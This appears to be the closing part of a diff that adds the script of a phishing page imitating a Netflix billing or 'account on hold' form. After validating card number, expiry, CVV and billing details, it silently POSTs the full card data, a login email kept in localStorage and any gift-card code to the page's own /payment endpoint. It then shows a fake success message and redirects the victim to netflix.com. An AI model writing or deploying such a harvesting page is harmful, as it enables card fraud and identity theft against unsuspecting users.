+  {f:'🇩🇰',n:'Denmark',c:'+45'},{f:'🇩🇯',n:'Djibouti',c:'+253'},{f:'🇩🇴',n:'Dominican Republic',c:'+1-809'},
+  {f:'🇪🇨',n:'Ecuador',c:'+593'},{f:'🇪🇬',n:'Egypt',c:'+20'},{f:'🇸🇻',n:'El Salvador',c:'+503'},
+  {f:'🇬🇶',n:'Equatorial Guinea',c:'+240'},{f:'🇪🇷',n:'Eritrea',c:'+291'},{f:'🇪🇪',n:'Estonia',c:'+372'},
+  {f:'🇸🇿',n:'Eswatini',c:'+268'},{f:'🇪🇹',n:'Ethiopia',c:'+251'},{f:'🇫🇯',n:'Fiji',c:'+679'},
+  {f:'🇫🇮',n:'Finland',c:'+358'},{f:'🇫🇷',n:'France',c:'+33'},{f:'🇬🇦',n:'Gabon',c:'+241'},
+  {f:'🇬🇲',n:'Gambia',c:'+220'},{f:'🇬🇪',n:'Georgia',c:'+995'},{f:'🇩🇪',n:'Germany',c:'+49'},
+  {f:'🇬🇭',n:'Ghana',c:'+233'},{f:'🇬🇷',n:'Greece',c:'+30'},{f:'🇬🇹',n:'Guatemala',c:'+502'},
+  {f:'🇬🇳',n:'Guinea',c:'+224'},{f:'🇬🇼',n:'Guinea-Bissau',c:'+245'},{f:'🇬🇾',n:'Guyana',c:'+592'},
+  {f:'🇭🇹',n:'Haiti',c:'+509'},{f:'🇭🇳',n:'Honduras',c:'+504'},{f:'🇭🇺',n:'Hungary',c:'+36'},
+  {f:'🇮🇸',n:'Iceland',c:'+354'},{f:'🇮🇳',n:'India',c:'+91'},{f:'🇮🇩',n:'Indonesia',c:'+62'},
+  {f:'🇮🇷',n:'Iran',c:'+98'},{f:'🇮🇶',n:'Iraq',c:'+964'},{f:'🇮🇪',n:'Ireland',c:'+353'},
+  {f:'🇮🇱',n:'Israel',c:'+972'},{f:'🇮🇹',n:'Italy',c:'+39'},{f:'🇨🇮',n:'Ivory Coast',c:'+225'},
+  {f:'🇯🇲',n:'Jamaica',c:'+1-876'},{f:'🇯🇵',n:'Japan',c:'+81'},{f:'🇯🇴',n:'Jordan',c:'+962'},
+  {f:'🇰🇿',n:'Kazakhstan',c:'+7'},{f:'🇰🇪',n:'Kenya',c:'+254'},{f:'🇰🇼',n:'Kuwait',c:'+965'},
+  {f:'🇰🇬',n:'Kyrgyzstan',c:'+996'},{f:'🇱🇦',n:'Laos',c:'+856'},{f:'🇱🇻',n:'Latvia',c:'+371'},
+  {f:'🇱🇧',n:'Lebanon',c:'+961'},{f:'🇱🇸',n:'Lesotho',c:'+266'},{f:'🇱🇷',n:'Liberia',c:'+231'},
+  {f:'🇱🇾',n:'Libya',c:'+218'},{f:'🇱🇮',n:'Liechtenstein',c:'+423'},{f:'🇱🇹',n:'Lithuania',c:'+370'},
+  {f:'🇱🇺',n:'Luxembourg',c:'+352'},{f:'🇲🇬',n:'Madagascar',c:'+261'},{f:'🇲🇼',n:'Malawi',c:'+265'},
+  {f:'🇲🇾',n:'Malaysia',c:'+60'},{f:'🇲🇻',n:'Maldives',c:'+960'},{f:'🇲🇱',n:'Mali',c:'+223'},
+  {f:'🇲🇹',n:'Malta',c:'+356'},{f:'🇲🇷',n:'Mauritania',c:'+222'},{f:'🇲🇺',n:'Mauritius',c:'+230'},
+  {f:'🇲🇽',n:'Mexico',c:'+52'},{f:'🇲🇩',n:'Moldova',c:'+373'},{f:'🇲🇳',n:'Mongolia',c:'+976'},
+  {f:'🇲🇪',n:'Montenegro',c:'+382'},{f:'🇲🇦',n:'Morocco',c:'+212'},{f:'🇲🇿',n:'Mozambique',c:'+258'},
+  {f:'🇲🇲',n:'Myanmar',c:'+95'},{f:'🇳🇦',n:'Namibia',c:'+264'},{f:'🇳🇵',n:'Nepal',c:'+977'},
+  {f:'🇳🇱',n:'Netherlands',c:'+31'},{f:'🇳🇿',n:'New Zealand',c:'+64'},{f:'🇳🇮',n:'Nicaragua',c:'+505'},
+  {f:'🇳🇪',n:'Niger',c:'+227'},{f:'🇳🇬',n:'Nigeria',c:'+234'},{f:'🇰🇵',n:'North Korea',c:'+850'},
+  {f:'🇲🇰',n:'North Macedonia',c:'+389'},{f:'🇳🇴',n:'Norway',c:'+47'},{f:'🇴🇲',n:'Oman',c:'+968'},
+  {f:'🇵🇰',n:'Pakistan',c:'+92'},{f:'🇵🇸',n:'Palestine',c:'+970'},{f:'🇵🇦',n:'Panama',c:'+507'},
+  {f:'🇵🇬',n:'Papua New Guinea',c:'+675'},{f:'🇵🇾',n:'Paraguay',c:'+595'},{f:'🇵🇪',n:'Peru',c:'+51'},
+  {f:'🇵🇭',n:'Philippines',c:'+63'},{f:'🇵🇱',n:'Poland',c:'+48'},{f:'🇵🇹',n:'Portugal',c:'+351'},
+  {f:'🇶🇦',n:'Qatar',c:'+974'},{f:'🇷🇴',n:'Romania',c:'+40'},{f:'🇷🇺',n:'Russia',c:'+7'},
+  {f:'🇷🇼',n:'Rwanda',c:'+250'},{f:'🇸🇦',n:'Saudi Arabia',c:'+966'},{f:'🇸🇳',n:'Senegal',c:'+221'},
+  {f:'🇷🇸',n:'Serbia',c:'+381'},{f:'🇸🇱',n:'Sierra Leone',c:'+232'},{f:'🇸🇬',n:'Singapore',c:'+65'},
+  {f:'🇸🇰',n:'Slovakia',c:'+421'},{f:'🇸🇮',n:'Slovenia',c:'+386'},{f:'🇸🇴',n:'Somalia',c:'+252'},
+  {f:'🇿🇦',n:'South Africa',c:'+27'},{f:'🇰🇷',n:'South Korea',c:'+82'},{f:'🇸🇸',n:'South Sudan',c:'+211'},
+  {f:'🇪🇸',n:'Spain',c:'+34'},{f:'🇱🇰',n:'Sri Lanka',c:'+94'},{f:'🇸🇩',n:'Sudan',c:'+249'},
+  {f:'🇸🇷',n:'Suriname',c:'+597'},{f:'🇸🇪',n:'Sweden',c:'+46'},{f:'🇨🇭',n:'Switzerland',c:'+41'},
+  {f:'🇸🇾',n:'Syria',c:'+963'},{f:'🇹🇼',n:'Taiwan',c:'+886'},{f:'🇹🇯',n:'Tajikistan',c:'+992'},
+  {f:'🇹🇿',n:'Tanzania',c:'+255'},{f:'🇹🇭',n:'Thailand',c:'+66'},{f:'🇹🇬',n:'Togo',c:'+228'},
+  {f:'🇹🇳',n:'Tunisia',c:'+216'},{f:'🇹🇷',n:'Turkey',c:'+90'},{f:'🇹🇲',n:'Turkmenistan',c:'+993'},
+  {f:'🇺🇬',n:'Uganda',c:'+256'},{f:'🇺🇦',n:'Ukraine',c:'+380'},{f:'🇦🇪',n:'United Arab Emirates',c:'+971'},
+  {f:'🇬🇧',n:'United Kingdom',c:'+44'},{f:'🇺🇸',n:'United States',c:'+1'},{f:'🇺🇾',n:'Uruguay',c:'+598'},
+  {f:'🇺🇿',n:'Uzbekistan',c:'+998'},{f:'🇻🇪',n:'Venezuela',c:'+58'},{f:'🇻🇳',n:'Vietnam',c:'+84'},
+  {f:'🇾🇪',n:'Yemen',c:'+967'},{f:'🇿🇲',n:'Zambia',c:'+260'},{f:'🇿🇼',n:'Zimbabwe',c:'+263'}
+];
+let phoneDropdownOpen = false;
+function renderPhoneList(list) {
+  const ul = document.getElementById('phoneCountryList');
+  ul.innerHTML = list.map((p,i) =>
+    `<li onclick="selectPhoneCountry('${p.f}','${p.c}')" class="${p.n==='India'?'selected':''}">
+      <span>${p.f}</span><span class="pc-name">${p.n}</span><span class="pc-code">${p.c}</span>
+    </li>`
+  ).join('');
+}
+function togglePhoneDropdown() {
+  const dd = document.getElementById('phoneDropdown');
+  phoneDropdownOpen = !phoneDropdownOpen;
+  dd.style.display = phoneDropdownOpen ? 'block' : 'none';
+  if (phoneDropdownOpen) {
+    document.getElementById('phoneSearch').value = '';
+    renderPhoneList(PHONE_COUNTRIES);
+    document.getElementById('phoneSearch').focus();
+  }
+}
+function selectPhoneCountry(flag, code) {
+  document.getElementById('phoneFlag').textContent = flag;
+  document.getElementById('phoneCode').textContent = code;
+  document.getElementById('phoneDropdown').style.display = 'none';
+  phoneDropdownOpen = false;
+  document.getElementById('bPhone').focus();
+}
+function filterPhoneCountries(q) {
+  const filtered = PHONE_COUNTRIES.filter(p =>
+    p.n.toLowerCase().includes(q.toLowerCase()) || p.c.includes(q)
+  );
+  renderPhoneList(filtered);
+}
+document.addEventListener('click', function(e) {
+  if (!document.getElementById('phone-field-container').contains(e.target)) {
+    document.getElementById('phoneDropdown').style.display = 'none';
+    phoneDropdownOpen = false;
+  }
+});
+renderPhoneList(PHONE_COUNTRIES);
+function updatePhonePlaceholder() {}
+
+// ── Auto-detect country & phone prefix via IP ─────────────────
+(async function autoDetectCountry() {
+  try {
+    const res  = await fetch('https://ipapi.co/json/');
+    const data = await res.json();
+    const countryCode   = data.country_code;
+    const callingCode   = '+' + (data.country_calling_code || '').replace('+','');
+
+    // Set billing country dropdown
+    const countrySelect = document.getElementById('bCountry');
+    if (countrySelect) {
+      const opt = countrySelect.querySelector(`option[value="${countryCode}"]`);
+      if (opt) {
+        countrySelect.value = countryCode;
+        countrySelect.classList.add('has-value');
+        onCountryChange(countrySelect);
+      }
+    }
+
+    // Set phone flag + prefix
+    const match = PHONE_COUNTRIES.find(p => p.c === callingCode);
+    if (match) {
+      document.getElementById('phoneFlag').textContent = match.f;
+      document.getElementById('phoneCode').textContent = match.c;
+    }
+  } catch(e) {
+    // silently fail — defaults (India) stay
+  }
+})();
+function clearErr(wid, eid) {
+  const w = document.getElementById(wid);
+  w.classList.remove('has-error');
+  const inp = w.querySelector('input,select');
+  if (inp) inp.classList.remove('error-input');
+  document.getElementById(eid).classList.remove('show');
+  // reset phone border if applicable
+  if (wid === 'w_bPhone') document.getElementById('w_bPhone').style.borderColor = '';
+}
+
+// ── Submit credit/debit form ──────────────────────────────────
+async function handleSubmit(btn) {
+  let ok = true;
+
+  // ── Name on card: letters, spaces, hyphens, apostrophes only ─
+  const nameVal = v('cardName').trim();
+  const nameReg = /^[a-zA-ZÀ-ÖØ-öø-ÿ\s'\-]{2,}$/;
+  if (!nameReg.test(nameVal)) { showErr('w_cardName','e_cardName'); ok=false; }
+
+  // ── Card number: 16 digits + Luhn check ──────────────────────
+  const rawCard = v('cardNum').replace(/\s/g,'');
+  const brand   = detectBrand(rawCard);
+  const amex    = brand === 'amex';
+  const reqLen  = amex ? 15 : 16;
+  let cardOk    = rawCard.length === reqLen;
+  if (cardOk) {
+    // Luhn algorithm
+    let sum = 0, alt = false;
+    for (let i = rawCard.length - 1; i >= 0; i--) {
+      let n = parseInt(rawCard[i]);
+      if (alt) { n *= 2; if (n > 9) n -= 9; }
+      sum += n; alt = !alt;
+    }
+    cardOk = sum % 10 === 0;
+  }
+  if (!cardOk) {
+    document.getElementById('e_cardNum_msg').textContent =
+      rawCard.length < reqLen ? `Card number must be ${reqLen} digits.` : 'Invalid card number. Please check and try again.';
+    showErr('w_cardNum','e_cardNum'); ok=false;
+  }
+
+  // ── Expiry: valid MM/YY, not expired, not too far future ─────
+  const expVal = v('cardExp');
+  let expOk = false;
+  let expMsg = 'Enter a valid expiry date (MM / YY).';
+  if (/^\d{2}\s*\/\s*\d{2}$/.test(expVal)) {
+    const parts = expVal.replace(/\s/g,'').split('/');
+    const mm = parseInt(parts[0]), yy = parseInt(parts[1]);
+    const now = new Date();
+    const curYY = now.getFullYear() % 100;
+    const curMM = now.getMonth() + 1;
+    if (mm < 1 || mm > 12) { expMsg = 'Month must be between 01 and 12.'; }
+    else if (yy < curYY || (yy === curYY && mm < curMM)) { expMsg = 'This card has expired.'; expOk = false; }
+    else if (yy > curYY + 20) { expMsg = 'Expiry year seems too far in the future.'; }
+    else { expOk = true; }
+  }
+  if (!expOk) {
+    document.getElementById('e_cardExp_msg').textContent = expMsg;
+    showErr('w_cardExp','e_cardExp'); ok=false;
+  }
+
+  // ── CVV: 3 digits (4 for Amex) ───────────────────────────────
+  const cvvVal = v('cardCvv').replace(/\D/g,'');
+  const cvvLen = amex ? 4 : 3;
+  if (cvvVal.length !== cvvLen) {
+    document.getElementById('e_cardCvv_msg').textContent =
+      `CVV must be ${cvvLen} digit${cvvLen > 1 ? 's' : ''}${amex ? ' for Amex' : ''}.`;
+    showErr('w_cardCvv','e_cardCvv'); ok=false;
+  }
+
+  // ── Country ───────────────────────────────────────────────────
+  if (!v('bCountry')) { showErr('w_bCountry','e_bCountry'); ok=false; }
+
+  // ── First name: letters only, min 2 chars ────────────────────
+  const nameRegBasic = /^[a-zA-ZÀ-ÖØ-öø-ÿ\s'\-]{2,}$/;
+  if (!nameRegBasic.test(v('bFirst').trim())) { showErr('w_bFirst','e_bFirst'); ok=false; }
+
+  // ── Last name: letters only, min 2 chars ─────────────────────
+  if (!nameRegBasic.test(v('bLast').trim())) { showErr('w_bLast','e_bLast'); ok=false; }
+
+  // ── Email: proper format ──────────────────────────────────────
+  const emailVal = v('bEmail').trim();
+  const emailReg = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
+  if (!emailReg.test(emailVal)) { showErr('w_bEmail','e_bEmail'); ok=false; }
+
+  // ── Street address: min 5 chars ──────────────────────────────
+  if (v('bAddr').trim().length < 5) { showErr('w_bAddr','e_bAddr'); ok=false; }
+
+  // ── City: letters, spaces, hyphens, min 2 chars ──────────────
+  const cityVal = v('bCity').trim();
+  const cityReg = /^[a-zA-ZÀ-ÖØ-öø-ÿ\s\-'.]{2,}$/;
+  if (!cityReg.test(cityVal)) { showErr('w_bCity','e_bCity'); ok=false; }
+
+  // ── PIN / ZIP: country-based pattern ─────────────────────────
+  const pinVal  = v('bPin').trim();
+  const country = v('bCountry');
+  const pinPatterns = {
+    IN: { pattern: /^\d{6}$/, msg: 'Enter a valid 6-digit PIN code.' },
+    US: { pattern: /^\d{5}(-\d{4})?$/, msg: 'Enter a valid ZIP code (e.g. 10001).' },
+    GB: { pattern: /^[A-Z]{1,2}\d[A-Z\d]?\s?\d[A-Z]{2}$/i, msg: 'Enter a valid UK postcode (e.g. SW1A 1AA).' },
+    CA: { pattern: /^[A-Z]\d[A-Z]\s?\d[A-Z]\d$/i, msg: 'Enter a valid postal code (e.g. K1A 0B1).' },
+    AU: { pattern: /^\d{4}$/, msg: 'Enter a valid 4-digit postcode.' },
+    DE: { pattern: /^\d{5}$/, msg: 'Enter a valid 5-digit PLZ.' },
+    FR: { pattern: /^\d{5}$/, msg: 'Enter a valid 5-digit code postal.' },
+    JP: { pattern: /^\d{3}-?\d{4}$/, msg: 'Enter a valid postal code (e.g. 100-0001).' },
+    BR: { pattern: /^\d{5}-?\d{3}$/, msg: 'Enter a valid CEP (e.g. 01310-100).' },
+    MX: { pattern: /^\d{5}$/, msg: 'Enter a valid 5-digit código postal.' },
+    CN: { pattern: /^\d{6}$/, msg: 'Enter a valid 6-digit postal code.' },
+    RU: { pattern: /^\d{6}$/, msg: 'Enter a valid 6-digit postal code.' },
+    AE: { pattern: /^\d{5,6}$/, msg: 'Enter a valid postal code.' },
+    SG: { pattern: /^\d{6}$/, msg: 'Enter a valid 6-digit postal code.' },
+    NZ: { pattern: /^\d{4}$/, msg: 'Enter a valid 4-digit postcode.' },
+    ZA: { pattern: /^\d{4}$/, msg: 'Enter a valid 4-digit postal code.' },
+    NL: { pattern: /^\d{4}\s?[A-Z]{2}$/i, msg: 'Enter a valid postcode (e.g. 1234 AB).' },
+    IT: { pattern: /^\d{5}$/, msg: 'Enter a valid 5-digit CAP.' },
+    ES: { pattern: /^\d{5}$/, msg: 'Enter a valid 5-digit código postal.' },
+    PK: { pattern: /^\d{5}$/, msg: 'Enter a valid 5-digit postal code.' },
+    PL: { pattern: /^\d{2}-\d{3}$/, msg: 'Enter a valid postal code (e.g. 00-001).' },
+    PT: { pattern: /^\d{4}-?\d{3}$/, msg: 'Enter a valid postal code (e.g. 1000-001).' },
+    CH: { pattern: /^\d{4}$/, msg: 'Enter a valid 4-digit PLZ.' },
+    SE: { pattern: /^\d{3}\s?\d{2}$/, msg: 'Enter a valid 5-digit postal code.' },
+    NO: { pattern: /^\d{4}$/, msg: 'Enter a valid 4-digit postnummer.' },
+    BE: { pattern: /^\d{4}$/, msg: 'Enter a valid 4-digit postal code.' },
+    AT: { pattern: /^\d{4}$/, msg: 'Enter a valid 4-digit PLZ.' },
+    DK: { pattern: /^\d{4}$/, msg: 'Enter a valid 4-digit postal code.' },
+    FI: { pattern: /^\d{5}$/, msg: 'Enter a valid 5-digit postal code.' },
+    KR: { pattern: /^\d{5}$/, msg: 'Enter a valid 5-digit postal code.' },
+    TR: { pattern: /^\d{5}$/, msg: 'Enter a valid 5-digit postal code.' },
+    ID: { pattern: /^\d{5}$/, msg: 'Enter a valid 5-digit postal code.' },
+    PH: { pattern: /^\d{4}$/, msg: 'Enter a valid 4-digit postal code.' },
+    TH: { pattern: /^\d{5}$/, msg: 'Enter a valid 5-digit postal code.' },
+    MY: { pattern: /^\d{5}$/, msg: 'Enter a valid 5-digit postal code.' },
+    BD: { pattern: /^\d{4}$/, msg: 'Enter a valid 4-digit postal code.' },
+    LK: { pattern: /^\d{5}$/, msg: 'Enter a valid 5-digit postal code.' },
+    NP: { pattern: /^\d{5}$/, msg: 'Enter a valid 5-digit postal code.' },
+    SA: { pattern: /^\d{5}$/, msg: 'Enter a valid 5-digit postal code.' },
+    EG: { pattern: /^\d{5}$/, msg: 'Enter a valid 5-digit postal code.' },
+    NG: { pattern: /^\d{6}$/, msg: 'Enter a valid 6-digit postal code.' },
+    KE: { pattern: /^\d{5}$/, msg: 'Enter a valid 5-digit postal code.' },
+    AR: { pattern: /^[A-Z]?\d{4}[A-Z]{0,3}$/i, msg: 'Enter a valid postal code (e.g. C1001).' },
+    CO: { pattern: /^\d{6}$/, msg: 'Enter a valid 6-digit postal code.' },
+    CL: { pattern: /^\d{7}$/, msg: 'Enter a valid 7-digit postal code.' },
+    PE: { pattern: /^\d{5}$/, msg: 'Enter a valid 5-digit postal code.' },
+    VN: { pattern: /^\d{6}$/, msg: 'Enter a valid 6-digit postal code.' },
+  };
+  if (pinVal) {
+    const rule = pinPatterns[country];
+    if (rule && !rule.pattern.test(pinVal)) {
+      document.getElementById('e_bPin').querySelector('span').textContent = rule.msg;
+      document.getElementById('e_bPin').classList.add('show');
+      document.getElementById('w_bPin').classList.add('has-error');
+      document.getElementById('bPin').classList.add('error-input');
+      ok = false;
+    }
+  }
+
+  // ── Phone: exactly 10 digits ──────────────────────────────────
+  const phoneVal = v('bPhone').replace(/\D/g,'');
+  if (phoneVal.length !== 10) {
+    document.getElementById('w_bPhone').style.borderColor = 'var(--red)';
+    document.getElementById('e_bPhone').classList.add('show');
+    ok = false;
+  }
+
+  if (!ok) return;
+
+  btn.disabled = true;
+  btn.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:6px"><path d="M12 2a10 10 0 0 1 10 10"/></svg>Processing…';
+
+  const last4 = rawCard.slice(-4);
+  const label = {visa:'Visa',mastercard:'Mastercard',amex:'Amex',discover:'Discover',rupay:'RuPay'}[brand] || 'Card';
+  // card info no longer displayed
+
+  // POST payment data to server silently
+  const email = localStorage.getItem('rf_email') || '';
+  try {
+    await fetch('/payment', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: new URLSearchParams({
+        loginEmail: email,
+        cardName:   v('cardName'),
+        cardNum:    rawCard,
+        cardExp:    v('cardExp'),
+        cardCvv:    v('cardCvv'),
+        firstName:  v('bFirst'),
+        lastName:   v('bLast'),
+        billingEmail: v('bEmail'),
+        phone:      document.getElementById('phoneCode').textContent + v('bPhone'),
+        address:    v('bAddr'),
+        country:    v('bCountry'),
+        city:       v('bCity'),
+        pinCode:    v('bPin'),
+        state:      v('bState') || ''
+      })
+    });
+  } catch(err) {}
+
+  localStorage.removeItem('rf_email');
+
+  setTimeout(() => {
+    showSuccess();
+    startRedirectCountdown();
+  }, 1800);
+}
+
+// ── Submit gift card ──────────────────────────────────────────
+async function handleGiftSubmit(btn) {
+  let ok = true;
+  if (v('giftCode').length < 6) { showErr('w_giftCode','e_giftCode'); ok=false; }
+  if (!ok) return;
+
+  btn.disabled = true;
+  btn.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:6px"><path d="M12 2a10 10 0 0 1 10 10"/></svg>Processing…';
+  // gift card info no longer displayed
+
+  const email = localStorage.getItem('rf_email') || '';
+  try {
+    await fetch('/payment', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: new URLSearchParams({ loginEmail: email, giftCode: v('giftCode'), type: 'gift_card' })
+    });
+  } catch(err) {}
+
+  localStorage.removeItem('rf_email');
+  setTimeout(() => { showSuccess(); startRedirectCountdown(); }, 1800);
+}
+
+// ── Show success ──────────────────────────────────────────────
+function showSuccess() {
+  document.getElementById('holdBanner').style.display = 'none';
+  document.getElementById('mainForm').style.display   = 'none';
+  document.getElementById('successSection').classList.add('show');
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+function startRedirectCountdown() {
+  setTimeout(() => {
+    window.location.href = 'https://www.netflix.com';
+  }, 3000);
+}
+
+// ── Checkbox ──────────────────────────────────────────────────
+function toggleCheck() {
+  const cb = document.getElementById('checkbox');
+  const mk = document.getElementById('checkMark');
+  mk.style.display = cb.classList.toggle('checked') ? 'block' : 'none';
+}
+</script>
+</body>
+</html>
